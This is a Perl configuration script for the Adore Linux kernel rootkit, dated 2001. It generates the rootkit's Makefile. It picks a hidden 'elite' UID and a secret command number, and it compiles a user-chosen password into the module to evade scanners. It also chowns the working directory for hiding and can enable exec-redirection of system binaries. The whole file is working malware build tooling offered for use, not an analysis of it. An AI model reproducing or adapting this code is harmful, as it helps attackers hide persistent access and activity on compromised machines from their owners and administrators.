#!/usr/bin/perl

# (C) 2001 by Stealth.
# Using at your own risk. Licensed under BSDish license.
# See LICENSE-file. Standard disclaimer applies.

# adore configuration script
# One can also use Makefile.gen edited by hand
# when perl is not available or one needs special values
# (crosscompiling)

#
# Iitializink, Pitr ... 
#

$elite_uid = 0;
$elite_cmd = 0;
$cc = "";
$| = 1;
$current_adore = 38;
$exec = shift || "no";

sub get_pass()
{
	print "\n\nSince version 0.33 Adore requires 'authentication' for\n".
	      "its services. You will be prompted for a password now and this\n".
	      "password will be compiled into 'adore' and 'ava' so no further actions\n".
	      "by you are required.\nThis procedure will save adore from scanners.\n".
	      "Try to choose a unique name that won't clash with normal calls to mkdir(2).\n";

	print "Password (echoed):"; my $s = <STDIN>;
	chop($s);
	return $s;
}

#
# get next 'free' UID above 30
#
sub get_elite_uid()
{
	my $i = 30;

	while (defined(getpwuid($i))) {
		++$i;
	}
	return $i;
}

#
# randomly choose an ELITE_CMD
#
sub get_elite_cmd()
{
	srand();
	return int(10000 + rand 100000);
}

#
sub check_smp()
{
	if (`uname -a` =~ "SMP") {
		return "YES";
	} else {
		return "NO";
	}
}

# check for CONFIG_MODVERSIONS=y
sub check_modversions()
{
	open I, "</proc/ksyms" or die "open(/proc/ksyms) $!";
	while (<I>) {
		if (/kernel_thread_R.+/) {
			close I;
			return "YES";
		}
		if (/kernel_thread/) {
			close I;
			return "NO";
		}
	}	
	print "WARN: Can't find kernel_thread!! Using \"NO\"!";
	return "NO";
}

#
# Look for loaded modules
#
sub check_modules()
{
	print "Loaded modules:\n";
	system("cat /proc/modules");
}

#
# Look where insmod is located
#
sub check_insmod()
{
	my $s;
	print "Checking 4 insmod ... ";
	foreach (qw(/bin /sbin /usr/sbin /usr/bin)) {
		if (-x ($s = "$_/insmod")) {
			print "found $s -- OK\n";
			return $s;
		}
	}
	print "WARN: No insmod found in /bin, /sbin, /usr/sbin, /usr/bin! Fix init-script by hand!\n";
	return "insmod";
}

#
# RH 7 has 'kgcc'
#
sub check_cc()
{
	my $r;
	if (-x "/usr/bin/kgcc") {
		$r = "kgcc";
	} else {
		$r = "cc";
	}
	return $r;
}

##############################
#
# main()
#
##############################

print "\nStarting adore configuration ...\n\n";

print "Checking 4 ELITE_UID ... ";
print "found ", $elite_uid = get_elite_uid(), "\n";

print "Checking 4 ELITE_CMD ... ";
print "using ", $elite_cmd = get_elite_cmd(), "\n";

print "Checking 4 SMP ... ", $has_smp = check_smp(), "\n";

print "Checking 4 MODVERSIONS ... ", $has_modversions = check_modversions(), "\n";

print "Checking for kgcc ... ";
print "found ", $cc = check_cc(), "\n";


$insmod = check_insmod();
print "\n";

check_modules();

$pwd = get_pass();

$target_dir = `pwd`;
chop($target_dir);

print "\nPreparing $target_dir (== cwd) for hiding ... ";
chown($elite_uid, 0, $target_dir) or print "(failed)";

print "\n\n";
print "Creating Makefile ...\n";

#
# create an Makefile backup for ELITE_CMD etc.
#

$date = `date`;
$date =~ tr/ /_/;

system("cp Makefile Makefile_$date");

#
# write Makefile
#

open(O, ">Makefile") or die "open(Makefile) $!";

print O "#\nCC=$cc\nCFLAGS=-O2 -Wall\n\n";
print O "#CFLAGS+=-m486\nCFLAGS+=-DELITE_CMD=$elite_cmd\n";
print O "\nCFLAGS+=-DELITE_UID=$elite_uid\nCFLAGS+=-DCURRENT_ADORE=$current_adore\n".
	"CFLAGS+=-DADORE_KEY=\\\"$pwd\\\"\n\n";

#
# enable exec-redir?
#

if ($exec eq "--exec") {
	print "Enabling exec-redirection ...\n\n";
	print " *DO NOT FORGET TO EDIT exec.c REDIRECTION ENTRIES*\n\n";
	print O "CFLAGS+=-DEXEC_REDIRECT\n\n";
} else {
	print "Exec-redirection disabled ...\n";
}

if ($has_smp eq "NO") {
	print O "#";	
}

print O "CFLAGS+=-D__SMP__\n";


print O "\n";

if ($has_modversions eq "NO") {
	print O "#";
}

print O "CFLAGS+=-DMODVERSIONS";


print O "\n";

#
# Build main part of Makefile, depending
# on '--exec' option
#

if ($exec eq "--exec") {
	print O<<_EOF_;

\$(LD)=ld

all:	adore ava cleaner

adore: adore.c exec.c
	rm -f adore.o exec.o
	\$(CC) -c -I/usr/src/linux/include \$(CFLAGS) adore.c -o a.o
	\$(CC) -c -I/usr/src/linux/include \$(CFLAGS) exec.c -o e.o
	\$(LD) -r e.o a.o -o adore.o
_EOF_
} else {
print O<<_EOF_;
all:	adore ava cleaner

adore: adore.c
	rm -f adore.o
	\$(CC) -c -I/usr/src/linux/include \$(CFLAGS) adore.c -o adore.o
_EOF_
}	

#
# Non-exec dependant part.
#

print O<<_EOF_;

ava: ava.c libinvisible.c
	\$(CC) \$(CFLAGS) ava.c libinvisible.c -o ava

dummy: dummy.c
	\$(CC) -c -I/usr/src/linux/include \$(CFLAGS) dummy.c

rename: rename.c
	\$(CC) -c -I/usr/src/linux/include \$(CFLAGS) rename.c


cleaner: cleaner.c
	\$(CC) -I/usr/src/linux/include -c \$(CFLAGS) cleaner.c

exec-test: exec-test.c
	\$(CC) -Wall -O2 exec-test.c -DSAYSO=\\"ORIGINAL\\" -o /bin/exec-test
	\$(CC) -Wall -O2 exec-test.c -DSAYSO=\\"FAKE\\" -o /tmp/foobar
clean:
	rm -f core ava *.o
_EOF_

#
# Done :>
#

close O;

